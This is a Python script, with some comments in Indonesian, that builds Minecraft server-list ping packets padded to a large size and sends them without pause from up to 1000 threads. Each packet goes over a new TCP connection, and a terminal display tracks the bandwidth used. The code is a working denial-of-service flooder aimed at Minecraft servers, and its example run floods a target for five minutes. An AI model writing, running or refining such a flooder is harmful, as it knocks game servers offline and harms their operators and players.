from socket import socket, AF_INET, SOCK_STREAM
from threading import Thread
from time import time, sleep
from random import randint
import struct
import json
import concurrent.futures

class MinecraftPing:
    def __init__(self, ip, port=25565, force=1250, threads=100):
        self.ip = ip
        self.port = port
        self.force = force  # default: 1250
        self.threads = threads  # default: 100
        self.on = False
        self.sent = 0
        
        # Minecraft protocol constants
        self.protocol_version = 47  # Protocol version (varies by Minecraft version)
        self.next_state = 1  # 1 for status, 2 for login
        
    def _create_packet(self):
        # Create a Minecraft ping packet
        # Protocol for Server List Ping
        # https://wiki.vg/Server_List_Ping
        
        # Handshake packet
        packet = bytearray()
        
        # Packet ID for handshake
        packet.append(0x00)
        
        # Protocol version (VarInt)
        self._write_varint(packet, self.protocol_version)
        
        # Server address (String)
        self._write_string(packet, self.ip)
        
        # Server port (Unsigned Short)
        packet.extend(struct.pack('>H', self.port))
        
        # Next state (VarInt) - 1 for status
        self._write_varint(packet, self.next_state)
        
        # Prepend packet length
        length = len(packet)
        complete_packet = bytearray()
        self._write_varint(complete_packet, length)
        complete_packet.extend(packet)
        
        # Add status request packet (0x00 with no payload)
        status_packet = bytearray()
        self._write_varint(status_packet, 1)  # Length of 1
        status_packet.append(0x00)  # Packet ID for status request
        
        complete_packet.extend(status_packet)
        
        # Add padding to match the original force size
        if len(complete_packet) < self.force:
            padding = bytearray(self.force - len(complete_packet))
            complete_packet.extend(padding)
        
        return complete_packet
    
    def _write_varint(self, buffer, value):
        while True:
            temp = value & 0x7F
            value >>= 7
            if value != 0:
                temp |= 0x80
            buffer.append(temp)
            if value == 0:
                break
    
    def _write_string(self, buffer, value):
        encoded = value.encode('utf-8')
        self._write_varint(buffer, len(encoded))
        buffer.extend(encoded)
    
    def flood(self):
        self.on = True
        self.sent = 0
        
        # Tetap menggunakan thread terpisah untuk info
        Thread(target=self.info).start()
        
        # Gunakan ThreadPoolExecutor untuk mengelola pool thread
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=self.threads)
        self.futures = []
        
        # Submit task send ke dalam thread pool
        for _ in range(self.threads):
            future = self.executor.submit(self.send)
            self.futures.append(future)
    
    def info(self):
        interval = 0.05
        now = time()
        size = 0
        self.total = 0
        bytediff = 8
        mb = 1000000
        gb = 1000000000
        
        # Colors for terminal output
        fluo = "\033[38;5;47m"
        white = "\033[37m"
        purple = "\033[35m"
        
        while self.on:
            sleep(interval)
            if not self.on:
                break
            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(f"{fluo}{round(size)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {' '*20}", end='\r')
            now2 = time()
        
            if now + 1 >= now2:
                continue
            
            size = round(self.sent * bytediff / mb)
            self.sent = 0
            now += 1
    
    def stop(self):
        self.on = False
        # Tunggu semua task executor selesai
        if hasattr(self, 'executor'):
            self.executor.shutdown(wait=False)
    
    def send(self):
        packet = self._create_packet()
        packet_len = len(packet)
        
        while self.on:
            try:
                client = socket(family=AF_INET, type=SOCK_STREAM)
                client.settimeout(1)  # Set a timeout to prevent blocking
                client.connect((self.ip, self.port))
                client.send(packet)
                self.sent += packet_len
                client.close()
            except Exception as e:
                pass
    
    def _randport(self):
        return self.port or randint(1, 65535)


def stage(text):
    return text

# Example usage pake concurrent
if __name__ == "__main__":
    ip = "ip" 
    port = 25565 
    ping = MinecraftPing(ip, port, force=70000, threads=1000)
    print(f"Starting Minecraft ping to {ip}:{port}")
    ping.flood()
    
    try:
        sleep(300)
        ping.stop()
        print("\nStopped pinging")
    except KeyboardInterrupt:
        ping.stop()
        print("\nStopped pinging")
